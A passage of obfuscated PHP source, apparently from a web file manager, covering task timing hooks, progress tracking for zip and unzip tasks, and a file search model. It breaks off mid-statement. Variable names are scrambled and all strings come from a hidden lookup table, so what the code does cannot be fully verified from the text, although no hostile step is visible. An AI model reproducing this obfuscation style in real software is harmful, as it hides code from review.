$asyncAdd = false; private static $syncTask = false; public static function timeLimit($ÌàÉ¥éû, $ï€ÁÌı = 5.0) { if (!$ÌàÉ¥éû) { return; } $÷³Ÿâ¶ = Cache::get($ÌàÉ¥éû); if (!$÷³Ÿâ¶ || timeFloat() - floatVal($÷³Ÿâ¶) >= $ï€ÁÌı) { Cache::set($ÌàÉ¥éû, timeFloat(), $ï€ÁÌı * 10); return !0; } return !1; } public static function timeLimitCall($²Òşóß‹, $¹âÏ¤€, $ú¢ŞáµÆ, $ºå³¥ö = 5.0) { $ÖÔªÕƒ— =& $_SERVER[ì™ı‰º¯]; if (!$²Òşóß‹ || !$¹âÏ¤€) { return; } self::$asyncAdd = !0; $–ßå²‹‚ = $ÖÔªÕƒ—[1773]; $©ëÜíŞ– = Cache::get($–ßå²‹‚, !0); $€äıÑ²ó = array($ÖÔªÕƒ—[1774] => timeFloat(), $ÖÔªÕƒ—[1775] => timeFloat(), $ÖÔªÕƒ—[264] => $¹âÏ¤€, $ÖÔªÕƒ—[1768] => $ú¢ŞáµÆ, $ÖÔªÕƒ—[180] => $ºå³¥ö); if (is_array($©ëÜíŞ–[$²Òşóß‹])) { $€äıÑ²ó[$ÖÔªÕƒ—[1775]] = $©ëÜíŞ–[$²Òşóß‹][$ÖÔªÕƒ—[1775]]; } if (is_array($©ëÜíŞ–[$²Òşóß‹])) { if (timeFloat() - $©ëÜíŞ–[$²Òşóß‹][$ÖÔªÕƒ—[1774]] < $€äıÑ²ó[$ÖÔªÕƒ—[180]] * 0.3) { return; } $€äıÑ²ó[$ÖÔªÕƒ—[1775]] = $©ëÜíŞ–[$²Òşóß‹][$ÖÔªÕƒ—[1775]]; } $©ëÜíŞ–[$²Òşóß‹] = $€äıÑ²ó; Cache::set($–ßå²‹‚, $©ëÜíŞ–, 60); Cache::removeMemory($–ßå²‹‚); write_log($ÖÔªÕƒ—[1776] . $²Òşóß‹ . $ÖÔªÕƒ—[71] . $¹âÏ¤€, $ÖÔªÕƒ—[1770]); } public static function timeLimitCallLoop() { $Œœ•Ê =& $_SERVER[ì™ı‰º¯]; $ËìœÖ = array($Œœ•Ê[1777]); $‡İ’†ƒŸ = in_array(strtolower(ACTION), $ËìœÖ); if (!$‡İ’†ƒŸ && !self::$asyncAdd) { return; } $ô«­Ù–ó = $Œœ•Ê[1773]; $§’¨Ì = Cache::get($ô«­Ù–ó, !0); if (!$§’¨Ì || count($§’¨Ì) <= 0) { return; } $ŠƒôØíÍ = !1; $îã¶š¢ = timeFloat(); $“ºğøš¸ = array(); foreach ($§’¨Ì as $„”»­œà => $ñŞ”Ä‘”) { if ($îã¶š¢ - $ñŞ”Ä‘”[$Œœ•Ê[1775]] > $ñŞ”Ä‘”[$Œœ•Ê[180]]) { $ŠƒôØíÍ = !0; try { Hook::apply($ñŞ”Ä‘”[$Œœ•Ê[264]], $ñŞ”Ä‘”[$Œœ•Ê[1768]]); write_log($Œœ•Ê[1778] . $„”»­œà . $Œœ•Ê[71] . $ñŞ”Ä‘”[$Œœ•Ê[264]] . $Œœ•Ê[1779] . ACTION, $Œœ•Ê[1770]); } catch (Exception $ ×©­®Œ) { } continue; } $“ºğøš¸[$„”»­œà] = $ñŞ”Ä‘”; } if (!$ŠƒôØíÍ) { return; } if (!$“ºğøš¸) { return Cache::remove($ô«­Ù–ó); } Cache::set($ô«­Ù–ó, $“ºğøš¸, 60); Cache::removeMemory($ô«­Ù–ó); } public static function finished($”­ŞĞİ„, $à£ÙÓñ) { $·Ãîäï¥ =& $_SERVER[ì™ı‰º¯]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($·Ãîäï¥[264] => $”­ŞĞİ„, $·Ãîäï¥[1768] => $à£ÙÓñ); } private static function finishedRun() { $”Â”ıÖ­ =& $_SERVER[ì™ı‰º¯]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Øµı‹¡Œ) { try { Hook::apply($Øµı‹¡Œ[$”Â”ıÖ­[264]], $Øµı‹¡Œ[$”Â”ıÖ­[1768]]); } catch (Exception $³™‡¼³³) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¶µ¾³™Å =& $_SERVER[ì™ı‰º¯]; parent::startAfter(); Hook::bind($¶µ¾³™Å[1780], array($this, $¶µ¾³™Å[1781])); Hook::bind($¶µ¾³™Å[1192], array($this, $¶µ¾³™Å[1782])); $ûĞ§Çìæ =& $this->task; $ûĞ§Çìæ[$¶µ¾³™Å[1783]] = $¶µ¾³™Å[1193]; if (!$ûĞ§Çìæ[$¶µ¾³™Å[1569]]) { $ûĞ§Çìæ[$¶µ¾³™Å[1569]] = LNG($¶µ¾³™Å[1784]); } } protected function endAfter() { $ò¯î™ùÂ =& $_SERVER[ì™ı‰º¯]; parent::endAfter(); Hook::unbind($ò¯î™ùÂ[1780], array($this, $ò¯î™ùÂ[1781])); Hook::unbind($ò¯î™ùÂ[1192], array($this, $ò¯î™ùÂ[1782])); } public function updateAfter() { $ñ©¨¬ “ =& $_SERVER[ì™ı‰º¯]; $Â”„ş =& $this->task; if (!$Â”„ş[$ñ©¨¬ “[782]] || !$Â”„ş[$ñ©¨¬ “[759]]) { return; } if ($Â”„ş[$ñ©¨¬ “[1783]] == $ñ©¨¬ “[1193]) { $Ñ¦öÆïÏ = 0; if ($Â”„ş[$ñ©¨¬ “[1723]]) { $Ñ¦öÆïÏ = $Â”„ş[$ñ©¨¬ “[1724]] / $Â”„ş[$ñ©¨¬ “[1723]]; } $Â”„ş[$ñ©¨¬ “[1672]] = $Ñ¦öÆïÏ * 0.3; } else { if ($Â”„ş[$ñ©¨¬ “[1783]] == $ñ©¨¬ “[313]) { $Ñ¦öÆïÏ = $Â”„ş[$ñ©¨¬ “[1671]] / $Â”„ş[$ñ©¨¬ “[782]]; $Â”„ş[$ñ©¨¬ “[1672]] = 0.3 + $Ñ¦öÆïÏ * 0.4; } else { if ($Â”„ş[$ñ©¨¬ “[1783]] == $ñ©¨¬ “[107]) { $ŸØò“£Œ = 0; if ($Â”„ş[$ñ©¨¬ “[1725]] == $ñ©¨¬ “[107]) { $ŸØò“£Œ = $Â”„ş[$ñ©¨¬ “[1724]]; } $Ñ¦öÆïÏ = ($Â”„ş[$ñ©¨¬ “[1728]] + $ŸØò“£Œ) / $Â”„ş[$ñ©¨¬ “[759]]; $Â”„ş[$ñ©¨¬ “[1672]] = 0.3 + 0.4 + $Ñ¦öÆïÏ * 0.3; } } } if ($Â”„ş[$ñ©¨¬ “[1672]] > 0) { $ËĞ†ø© = timeFloat() - $Â”„ş[$ñ©¨¬ “[1674]] - $Â”„ş[$ñ©¨¬ “[1677]]; $Â”„ş[$ñ©¨¬ “[1678]] = $ËĞ†ø© * (1 - $Â”„ş[$ñ©¨¬ “[1672]]) / $Â”„ş[$ñ©¨¬ “[1672]]; } } public function addFile($ÑƒœíÇ) { $øÈá¥øÃ =& $_SERVER[ì™ı‰º¯]; $ÄŸí½ =& $this->task; $ñÒÔ·¡Û = IO::info($ÑƒœíÇ); $ÄŸí½[$øÈá¥øÃ[1721]] = $ñÒÔ·¡Û[$øÈá¥øÃ[32]]; $ÄŸí½[$øÈá¥øÃ[1723]] = $ñÒÔ·¡Û[$øÈá¥øÃ[76]]; $ÄŸí½[$øÈá¥øÃ[1724]] = 0; $ÄŸí½[$øÈá¥øÃ[1063]] = $øÈá¥øÃ[1744]; $ÄŸí½[$øÈá¥øÃ[1725]] = $øÈá¥øÃ[1193]; $ÄŸí½[$øÈá¥øÃ[759]] = $ñÒÔ·¡Û[$øÈá¥øÃ[76]]; $ÄŸí½[$øÈá¥øÃ[782]] = 1; $À²¼ƒî = 0; $ÄŸí½[$øÈá¥øÃ[1732]] = array($øÈá¥øÃ[1733] => $À²¼ƒî + 1, $øÈá¥øÃ[420] => $ñÒÔ·¡Û[$øÈá¥øÃ[32]], $øÈá¥øÃ[84] => $ñÒÔ·¡Û[$øÈá¥øÃ[84]], $øÈá¥øÃ[509] => $ñÒÔ·¡Û[$øÈá¥øÃ[509]] ? $ñÒÔ·¡Û[$øÈá¥øÃ[509]] : $ñÒÔ·¡Û[$øÈá¥øÃ[84]]); $this->update(); } public function unzipAfter($–•½„â·) { $ªøãáµÖ =& $_SERVER[ì™ı‰º¯]; $’¾àŞ³ =& $this->task; $’¾àŞ³[$ªøãáµÖ[1783]] = $ªøãáµÖ[107]; $“¾Œ½² = IO::infoWithChildren($–•½„â·); $„ØâÔ” = 0; $’¾àŞ³[$ªøãáµÖ[1732]] = array($ªøãáµÖ[1733] => $„ØâÔ” + 1, $ªøãáµÖ[420] => $“¾Œ½²[$ªøãáµÖ[32]], $ªøãáµÖ[84] => $“¾Œ½²[$ªøãáµÖ[84]], $ªøãáµÖ[509] => $“¾Œ½²[$ªøãáµÖ[509]] ? $“¾Œ½²[$ªøãáµÖ[509]] : $“¾Œ½²[$ªøãáµÖ[84]]); if ($“¾Œ½²[$ªøãáµÖ[33]] == $ªøãáµÖ[200]) { $’¾àŞ³[$ªøãáµÖ[782]] = 1; } else { $’¾àŞ³[$ªøãáµÖ[782]] = $“¾Œ½²[$ªøãáµÖ[79]][$ªøãáµÖ[77]]; } $’¾àŞ³[$ªøãáµÖ[1063]] = $ªøãáµÖ[12]; $’¾àŞ³[$ªøãáµÖ[1725]] = 0; $’¾àŞ³[$ªøãáµÖ[1671]] = 0; $’¾àŞ³[$ªøãáµÖ[1723]] = 0; $’¾àŞ³[$ªøãáµÖ[1724]] = 0; $’¾àŞ³[$ªøãáµÖ[1721]] = $ªøãáµÖ[12]; $’¾àŞ³[$ªøãáµÖ[1728]] = 0; $’¾àŞ³[$ªøãáµÖ[759]] = $“¾Œ½²[$ªøãáµÖ[76]]; $this->update(); self::log($ªøãáµÖ[1785] . json_encode(array($’¾àŞ³, $“¾Œ½²))); } public function nameParse($ÑûÈíÕÈ) { $‹¾áµ÷ =& $_SERVER[ì™ı‰º¯]; $Ë¢°º¾İ =& $this->task; if ($Ë¢°º¾İ[$‹¾áµ÷[1783]] == $‹¾áµ÷[1193]) { $Ë¢°º¾İ[$‹¾áµ÷[1783]] = $‹¾áµ÷[313]; $Ë¢°º¾İ[$‹¾áµ÷[1728]] = 0; $Ë¢°º¾İ[$‹¾áµ÷[759]] = 0; } $ï´ãŠ­§ = get_path_this($ÑûÈíÕÈ); if (strstr($ï´ãŠ­§, $‹¾áµ÷[10])) { $Ë¢°º¾İ[$‹¾áµ÷[1671]] += 1; $Ë¢°º¾İ[$‹¾áµ÷[782]] += 1; } $Ë¢°º¾İ[$‹¾áµ÷[1721]] = $ÑûÈíÕÈ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $®¾¬Ë¡Ç =& $_SERVER[ì™ı‰º¯]; parent::startAfter(); Hook::bind($®¾¬Ë¡Ç[1786], array($this, $®¾¬Ë¡Ç[1781])); $àäãá– =& $this->task; $àäãá–[$®¾¬Ë¡Ç[1783]] = $®¾¬Ë¡Ç[1193]; if (!$àäãá–[$®¾¬Ë¡Ç[1569]]) { $àäãá–[$®¾¬Ë¡Ç[1569]] = LNG($®¾¬Ë¡Ç[1787]); } } protected function endAfter() { $Ê¨Š³Êæ =& $_SERVER[ì™ı‰º¯]; parent::endAfter(); Hook::unbind($Ê¨Š³Êæ[1786], array($this, $Ê¨Š³Êæ[1781])); } public function updateAfter() { $µÀÁ´´ =& $_SERVER[ì™ı‰º¯]; $ñõ™ªÑØ =& $this->task; if (!$ñõ™ªÑØ[$µÀÁ´´[782]] || !$ñõ™ªÑØ[$µÀÁ´´[759]]) { return; } if ($ñõ™ªÑØ[$µÀÁ´´[1783]] == $µÀÁ´´[1193]) { $ÍªÄçÔ¦ = $ñõ™ªÑØ[$µÀÁ´´[1724]]; if ($ñõ™ªÑØ[$µÀÁ´´[1725]] != $µÀÁ´´[1193]) { $ÍªÄçÔ¦ = 0; } $¦¶òŞƒ = ($ñõ™ªÑØ[$µÀÁ´´[1728]] + $ÍªÄçÔ¦) / $ñõ™ªÑØ[$µÀÁ´´[759]]; $ñõ™ªÑØ[$µÀÁ´´[1672]] = $¦¶òŞƒ * 0.3; } else { if ($ñõ™ªÑØ[$µÀÁ´´[1783]] == $µÀÁ´´[313]) { $¦¶òŞƒ = $ñõ™ªÑØ[$µÀÁ´´[1671]] / $ñõ™ªÑØ[$µÀÁ´´[782]]; $ñõ™ªÑØ[$µÀÁ´´[1672]] = 0.3 + $¦¶òŞƒ * 0.5; } else { if ($ñõ™ªÑØ[$µÀÁ´´[1783]] == $µÀÁ´´[107]) { $¦¶òŞƒ = 0; if ($ñõ™ªÑØ[$µÀÁ´´[1723]]) { $¦¶òŞƒ = $ñõ™ªÑØ[$µÀÁ´´[1724]] / $ñõ™ªÑØ[$µÀÁ´´[1723]]; } $ñõ™ªÑØ[$µÀÁ´´[1672]] = 0.3 + 0.5 + $¦¶òŞƒ * 0.2; } } } if ($ñõ™ªÑØ[$µÀÁ´´[1672]] > 0) { $¦Ø¢’«Ó = timeFloat() - $ñõ™ªÑØ[$µÀÁ´´[1674]] - $ñõ™ªÑØ[$µÀÁ´´[1677]]; $ñõ™ªÑØ[$µÀÁ´´[1678]] = $¦Ø¢’«Ó * (1 - $ñõ™ªÑØ[$µÀÁ´´[1672]]) / $ñõ™ªÑØ[$µÀÁ´´[1672]]; } } public function copyFileStart($ŸÌî¨è¬, $†ûøˆÆ§, $ğ¤âË¾, $ã‡‰øÒË, $‰²éÆÊò, $³­©Õ¿Æ) { $€ŠÄ÷ì =& $_SERVER[ì™ı‰º¯]; parent::copyFileStart($ŸÌî¨è¬, $†ûøˆÆ§, $ğ¤âË¾, $ã‡‰øÒË, $‰²éÆÊò, $³­©Õ¿Æ); $›·‘º =& $this->task; if ($›·‘º[$€ŠÄ÷ì[1783]] == $€ŠÄ÷ì[313]) { $›·‘º[$€ŠÄ÷ì[1783]] = $€ŠÄ÷ì[107]; } $this->update(); } public function copyFileEnd($•Æ¹ö‰’, $ö†™÷, $îğ¹ùåë, $²Ã°¼, $¯˜ø©­, $«êÒ†’) { $½ÅñÙĞ =& $_SERVER[ì™ı‰º¯]; $‹Ş¯± =& $this->task; $‹Ş¯±[$½ÅñÙĞ[1724]] = $‹Ş¯±[$½ÅñÙĞ[1723]]; $‹Ş¯±[$½ÅñÙĞ[1728]] += $‹Ş¯±[$½ÅñÙĞ[1723]]; $‹Ş¯±[$½ÅñÙĞ[1725]] = $½ÅñÙĞ[12]; $this->update(); } public function nameParse($ÀÕ•ùú‰) { $¶ùŒäØ‰ =& $_SERVER[ì™ı‰º¯]; $ù³Ä·¡ì =& $this->task; if ($ù³Ä·¡ì[$¶ùŒäØ‰[1671]] < $ù³Ä·¡ì[$¶ùŒäØ‰[782]]) { $™¨Á– = get_path_this($ÀÕ•ùú‰); if (strstr($™¨Á–, $¶ùŒäØ‰[10])) { $ù³Ä·¡ì[$¶ùŒäØ‰[1671]] += 1; } } if ($ù³Ä·¡ì[$¶ùŒäØ‰[1783]] == $¶ùŒäØ‰[1193]) { $ù³Ä·¡ì[$¶ùŒäØ‰[1783]] = $¶ùŒäØ‰[313]; } $ù³Ä·¡ì[$¶ùŒäØ‰[1721]] = $ÀÕ•ùú‰; $this->update(); } } goto F”ÜŸ½¸ë±; dŞŸÍ…øğ£: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($áµù³Õı) { $—œ½óù’ =& $_SERVER[ì™ı‰º¯]; $ÇËİ¨îÏ = KodIO::fileTypeList(); $Æ£œ°¬ = $ÇËİ¨îÏ[$áµù³Õı]; if (!$Æ£œ°¬) { return array(); } $˜¡«úä¨ = $Æ£œ°¬[$—œ½óù’[174]]; $ù…®Ìú· = $—œ½óù’[7]; if (!$Æ£œ°¬[$—œ½óù’[174]]) { $ØÁ‡±´Ñ = array_to_keyvalue($ÇËİ¨îÏ, $—œ½óù’[12], $—œ½óù’[174]); $˜¡«úä¨ = implode($—œ½óù’[50], $ØÁ‡±´Ñ); $ù…®Ìú· = $—œ½óù’[2114]; } $áÍƒÈÆ» = explode($—œ½óù’[50], trim($˜¡«úä¨, $—œ½óù’[50])); return array($ù…®Ìú·, $áÍƒÈÆ»); } public function listPathType($–Óßëñ) { $¶¹²¾š =& $_SERVER[ì™ı‰º¯]; $¡‘Íîá¾ = $this->fileTypeWhere($–Óßëñ); if (!$¡‘Íîá¾) { return array(); } $â©èÙ¢Ş = USER_ID; $ÕÁÎ´˜¥ = Model($¶¹²¾š[525])->getInfo($â©èÙ¢Ş); $Ëı¬«Şó = array($¶¹²¾š[576] => SourceModel::TYPE_USER, $¶¹²¾š[511] => array($¶¹²¾š[540], $¶¹²¾š[521] . $ÕÁÎ´˜¥[$¶¹²¾š[87]][$¶¹²¾š[402]] . $¶¹²¾š[541]), $¶¹²¾š[577] => $â©èÙ¢Ş, $¶¹²¾š[574] => 0, $¶¹²¾š[575] => $¡‘Íîá¾); return $this->listSource($Ëı¬«Şó); } public function listSearch($£ñ¦³Ä, $—üÍÕ­® = 300) { $ú…”ƒîÒ =& $_SERVER[ì™ı‰º¯]; if (isset($£ñ¦³Ä[$ú…”ƒîÒ[1953]]) && $£ñ¦³Ä[$ú…”ƒîÒ[1953]]) { $£ñ¦³Ä[$ú…”ƒîÒ[1953]] = str_replace($ú…”ƒîÒ[384], $ú…”ƒîÒ[2115], trim($£ñ¦³Ä[$ú…”ƒîÒ[1953]])); } $‡Åøñ‹ = $this->_parseSearchWhere($£ñ¦³Ä); if (!isset($‡Åøñ‹[$ú…”ƒîÒ[431]])) { $‡Åøñ‹[$ú…”ƒîÒ[431]] = 0; } $ñ¬¢½ôÌ = $ú…”ƒîÒ[2116]; $æì¸¹û± = $‡Åøñ‹; $Òœş²Œ€ = $ñ¬¢½ôÌ; $this->_listSearchBindPinyin($£ñ¦³Ä, $‡Åøñ‹, $ñ¬¢½ôÌ); $this->alias($ú…”ƒîÒ[446])->_makeOrder(); $‡Åøñ‹ = $this->parseWhereLike($‡Åøñ‹); $©†æ’œ = $this->distinct(!0)->field($ñ¬¢½ôÌ)->where($‡Åøñ‹)->selectPage($—üÍÕ­®); if ($GLOBALS[$ú…”ƒîÒ[6]][$ú…”ƒîÒ[381]][$ú…”ƒîÒ[382]] && Input::check($£ñ¦³Ä[$ú…”ƒîÒ[1953]], $ú…”ƒîÒ[583]) && $©†æ’œ[$ú…”ƒîÒ[366]][$ú…”ƒîÒ[353]] == 1 && $©†æ’œ[$ú…”ƒîÒ[366]][$ú…”ƒîÒ[367]] == 0) { $©†æ’œ = $this->distinct(!0)->field($ñ¬¢½ôÌ)->where($æì¸¹û±)->limit(1000)->select(); $©†æ’œ = array_page_split($©†æ’œ, !1, $—üÍÕ­®); } $this->_listSearchFileContent($©†æ’œ, $£ñ¦³Ä, $Òœş²Œ€, $æì¸¹û±); $this->_listSearchDesc($©†æ’œ, $£ñ¦³Ä, $Òœş²Œ€); $this->_listSearchTag($©†æ’œ, $£ñ¦³Ä, $Òœş²Œ€); $this->_listSearchGroupTag($©†æ’œ, $£ñ¦³Ä, $Òœş²Œ€); $this->_listDataApply($©†æ’œ[$ú…”ƒîÒ[369]]); $this->_listMake($©†æ’œ); return $©†æ’œ; } private function _listSearchFileContent(&$–‘Œ“˜¼, $´ÏÅ·ùó, $åñ™£™Ë, $£ñğèº) { $œ€Åˆ€Û =& $_SERVER[ì™ı‰º¯]; if (!$´ÏÅ·ùó[$œ€Åˆ€Û[1953]] || $–‘Œ“˜¼[$œ€Åˆ€Û[366]][$œ€Åˆ€Û[353]] > 1) { return; } if (!isset($£ñğèº[$œ€Åˆ€Û[32]]) || !is_array($´ÏÅ·ùó[$œ€Åˆ€Û[468]])) { return; } $£ñğèº[$œ€Åˆ€Û[468]] = array($œ€Åˆ€Û[7], $´ÏÅ·ùó[$œ€Åˆ€Û[468]]); unset($£ñğèº[$œ€Åˆ€Û[32]]); unset($´ÏÅ·ùó[$œ€Åˆ€Û[468]]); $ÄşåÁæ¾ = $this->field($åñ™£™Ë)->where($£ñğèº)->limit($œ€Åˆ€Û[2117])->select(); if (!$ÄşåÁæ¾ || count($ÄşåÁæ¾) == 0) { return; } $–‘Œ“˜¼[$œ€Åˆ€Û[369]] = array_merge($ÄşåÁæ¾, $–‘Œ“˜¼[$œ€Åˆ€Û[369]]); $–‘Œ“˜¼[$œ€Åˆ€Û[366]][$œ€Åˆ€Û[367]] += count($ÄşåÁæ¾); } private function _listSearchTag(&$À¯ïˆ·Æ, $Ú½¤œÆ“, $î­Ó§«) { $…àÃŸ¬û =& $_SERVER[ì™ı‰º¯]; if (!$Ú½¤œÆ“[$…àÃŸ¬û[1953]] || $À¯ïˆ·Æ[$…àÃŸ¬û[366]][$…àÃŸ¬û[353]] > 1) { return; } $Ë’°Ì¢ = Model($…àÃŸ¬û[2118])->listData(); $—±¼± = array(); $ò·´ûÕÕ = $Ú½¤œÆ“[$…àÃŸ¬û[1953]]; foreach ($Ë’°Ì¢ as $ñÊ…ÜÖ¢) { $êÒà®œŒ = $ñÊ…ÜÖ¢[$…àÃŸ¬û[32]]; $ØÒÙÖ = str_replace($…àÃŸ¬û[53], $…àÃŸ¬û[12], Pinyin::get($êÒà®œŒ)); if (stripos($êÒà®œŒ, $ò·´ûÕÕ) !== !1 || stripos($ØÒÙÖ, $ò·´ûÕÕ) !== !1) { $—±¼±[] = $ñÊ…ÜÖ¢[$…àÃŸ¬û[399]]; } } if (!$—±¼±) { return; } $˜éŸ¨¹ı = array($…àÃŸ¬û[426] => array($…àÃŸ¬û[7], $—±¼±), $…àÃŸ¬û[1670] => USER_ID); $ëşìÀĞÎ = Model($…àÃŸ¬û[428])->field($…àÃŸ¬û[84])->where($˜éŸ¨¹ı)->select(); $ëşìÀĞÎ = array_to_keyvalue($ëşìÀĞÎ, $…àÃŸ¬û[12], $…àÃŸ¬û[84]); $†™¥¬ß = array_unique($ëşìÀĞÎ); $this->_listSearchMerge($À¯ïˆ·Æ, $Ú½¤œÆ“, $î­Ó§«, $†™¥¬ß); } private function _listSearchDesc(&$Ë×ŸÙ–, $ÓÃÕÛ¹Æ, $±ô”İáÙ) { $’†«ÖŸ¯ =& $_SERVER[ì™ı‰º¯]; if (!$ÓÃÕÛ¹Æ[$’†«ÖŸ¯[1953]] || $Ë×ŸÙ–[$’†«ÖŸ¯[366]][$’†«ÖŸ¯[353]] > 1) { return; } $“¿˜‚­ö = array($’†«ÖŸ¯[94] => $’†«ÖŸ¯[453], $’†«ÖŸ¯[374] => array($’†«ÖŸ¯[383], $’†«ÖŸ¯[1955] . $ÓÃÕÛ¹Æ[$’†«ÖŸ¯[1953]] . $’†«ÖŸ¯[1955])); $½ÆŠšîñ = !1; if ($½ÆŠšîñ) { $­Š‚¼™á = $this->listSearchChildren($ÓÃÕÛ¹Æ[$’†«ÖŸ¯[432]]); $­Š‚¼™á = array_unique($­Š‚¼™á); if (!$­Š‚¼™á) { return; } $“¿˜‚­ö[$’†«ÖŸ¯[402]] = array($’†«ÖŸ¯[7], $­Š‚¼™á); } $¢³Ü­›› = Model($’†«ÖŸ¯[560])->field($’†«ÖŸ¯[402])->where($“¿˜‚­ö)->limit(5000)->select(); $¡¢ïşü· = array_to_keyvalue($¢³Ü­››, $’†«ÖŸ¯[12], $’†«ÖŸ¯[402]); $this->_listSearchMerge($Ë×ŸÙ–, $ÓÃÕÛ¹Æ, $±ô”İáÙ, $¡¢ïşü·); } private function _listSearchGroupTag(&$ÆÓŠ²øŠ, $³Ü€äÛ, $·¯ÇÃä) { $ïíŒú´ =& $_SERVER[ì™ı‰º¯]; if (!$³Ü€äÛ[$ïíŒú´[1953]] || $ÆÓŠ²øŠ[$ïíŒú´[366]][$ïíŒú´[353]] > 1 || !$³Ü€äÛ[$ïíŒú´[432]]) { return; } $Û©áœØ· = $this->sourceInfo($³Ü€äÛ[$ïíŒú´[432]]); if (!$Û©áœØ· || $Û©áœØ·[$ïíŒú´[411]] != SourceModel::TYPE_GROUP) { return; } $ÔÜş˜Á = $Û©áœØ·[$ïíŒú´[496]]; $Ì˜õúù• = Model($ïíŒú´[2119])->get($ÔÜş˜Á); $ÈÁ†ÍÌî = array(); $à ­ã° = $³Ü€äÛ[$ïíŒú´[1953]]; foreach ($Ì˜õúù•[$ïíŒú´[369]] as $“ŸÉ¿°) { $‰ùÁá“ = $“ŸÉ¿°[$ïíŒú´[32]]; $óãş¼…¬ = str_replace($ïíŒú´[53], $ïíŒú´[12], Pinyin::get($‰ùÁá“)); if (stripos($‰ùÁá“, $à ­ã°) !== !1 || stripos($óãş¼…¬, $à ­ã°) !== !1) { $ÈÁ†ÍÌî[] = $“ŸÉ¿°[$ïíŒú´[399]]; } } if (!$ÈÁ†ÍÌî) { return; } $æÏ›”Ä = array($ïíŒú´[426] => array($ïíŒú´[7], $ÈÁ†ÍÌî), $ïíŒú´[1670] => 0, $ïíŒú´[33] => $ïíŒú´[1975] . $ÔÜş˜Á); $é‘´õš© = Model($ïíŒú´[428])->field($ïíŒú´[84])->where($æÏ›”Ä)->select(); $é‘´õš© = array_to_keyvalue($é‘´õš©, $ïíŒú´[12], $ïíŒú´[84]); $µ¥Òô¢ï = array_unique($é‘´õš©); $this->_listSearchMerge($ÆÓŠ²øŠ, $³Ü€äÛ, $·¯ÇÃä, $µ¥Òô¢ï); } private function _listSearchMerge(&$€ÛÖì²‰, $ŸÃÚŸşŸ, $âš“´åà, $üƒ•ı) { $–ÜãÒ«‡ =& $_SERVER[ì™ı‰º¯]; if (!$üƒ•ı) { return; } $ÅÍ¨ºàë = array_to_keyvalue($€ÛÖì²‰[$–ÜãÒ«‡[369]], $–ÜãÒ«‡[12], $–ÜãÒ«‡[402]); $ûŒªŸöª = array_diff($üƒ•ı, $ÅÍ¨ºàë); if (!$ûŒªŸöª) { return; } $ãªÛöÁ = array($–ÜãÒ«‡[402] => array($–ÜãÒ«‡[7], $ûŒªŸöª)); $”Ø¶‹š› = $this->field($âš“´åà)->where($ãªÛöÁ)->select(); if (!$”Ø¶‹š›) { return; } $’¦ı£« = array(); foreach ($”Ø¶‹š› as $èıÚÌ¬) { if ($this->_listSearchFilter($èıÚÌ¬, $ŸÃÚŸşŸ)) { $’¦ı£«[] = $èıÚÌ¬; } } $€ÛÖì²‰[$–ÜãÒ«‡[369]] = array_merge($’¦ı£«, $€ÛÖì²‰[$–ÜãÒ«‡[369]]); $€ÛÖì²‰[$–ÜãÒ«‡[366]][$–ÜãÒ«‡[367]] += count($’¦ı£«); } private function _listSearchFilter($¤¶…ŒÛ†, $­…„±ş) { $‹Ÿø¶¡è =& $_SERVER[ì™ı‰º¯]; $ Åœë = $¤¶…ŒÛ†[$‹Ÿø¶¡è[410]] == $‹Ÿø¶¡è[88]; if (!strstr($¤¶…ŒÛ†[$‹Ÿø¶¡è[511]], $‹Ÿø¶¡è[50] . $­…„±ş[$‹Ÿø¶¡è[432]] . $‹Ÿø¶¡è[50])) { return !1; } if (isset($­…„±ş[$‹Ÿø¶¡è[412]]) && $­…„±ş[$‹Ÿø¶¡è[412]] != $‹Ÿø¶¡è[1914]) { if ($­…„±ş[$‹Ÿø¶¡è[412]] == $‹Ÿø¶¡è[75] && !$ Åœë) { return !1; } if ($­…„±ş[$‹Ÿø¶¡è[412]] != $‹Ÿø¶¡è[75] && $ Åœë) { return !1; } if (!strstr($¤¶…ŒÛ†[$‹Ÿø¶¡è[174]], $‹Ÿø¶¡è[50] . $­…„±ş[$‹Ÿø¶¡è[412]] . $‹Ÿø¶¡è[50])) { return !1; } } if (isset($­…„±ş[$‹Ÿø¶¡è[2120]]) && $­…„±ş[$‹Ÿø¶¡è[2120]] < $¤¶…ŒÛ†[$‹Ÿø¶¡è[76]]) { return !1; } if (isset($­…„±ş[$‹Ÿø¶¡è[2121]]) && $­…„±ş[$‹Ÿø¶¡è[2121]] > $¤¶…ŒÛ†[$‹Ÿø¶¡è[76]]) { return !1; } if (isset($­…„±ş[$‹Ÿø¶¡è[590]]) && $­…„±ş[$‹Ÿø¶¡è[590]] != $¤¶…ŒÛ†[$‹Ÿø¶¡è[456]]) { return !1; } return !0; } public function listSearchChildren($ŸœçÆæ, $Ø¥ØÅå = 5000) { $æÈûñÀ… =& $_SERVER[ì™ı‰º¯]; $×Œ û¸ = array(); $µ‘˜áš² = $this->sourceInfo($ŸœçÆæ); $ÁÀï–ü÷ = array($æÈûñÀ…[511] => array($æÈûñÀ…[383], $µ‘˜áš²[$æÈûñÀ…[511]] . $µ‘˜áš²[$æÈûñÀ…[402]] . $æÈûñÀ…[541])); $³ë—ª²Ä = $this->field($æÈûñÀ…[76])->where($ÁÀï–ü÷)->limit($Ø¥ØÅå + 1)->select(); $ë½´Ã«á = is_array($³ë—ª²Ä) ? count($³ë—ª²Ä) : 0; if ($ë½´Ã«á > $Ø¥ØÅå) { return $this->_listSearchChildrenNear($ŸœçÆæ, $Ø¥ØÅå); } $ØÉìí‚Ä = $this->field($æÈûñÀ…[402])->where($ÁÀï–ü÷)->select(); $×Œ û¸ = array_to_keyvalue($ØÉìí‚Ä, $æÈûñÀ…[12], $æÈûñÀ…[402]); return $×Œ û¸; } private function _listSearchChildrenNear($úÓ¶™’à, $¾ŠÎÇ¿) { $êô¢¦ëè =& $_SERVER[ì™ı‰º¯]; $©æßÑõ = array(); $Ñ¯¹°Ò» = array($êô¢¦ëè[432] => $úÓ¶™’à); $è°çº­û = $this->field($êô¢¦ëè[2122])->where($Ñ¯¹°Ò»)->select(); $“°´ƒ­‘ = array_to_keyvalue(array_filter_by_field($è°çº­û, $êô¢¦ëè[410], $êô¢¦ëè[88]), $êô¢¦ëè[12], $êô¢¦ëè[402]); $©æßÑõ = 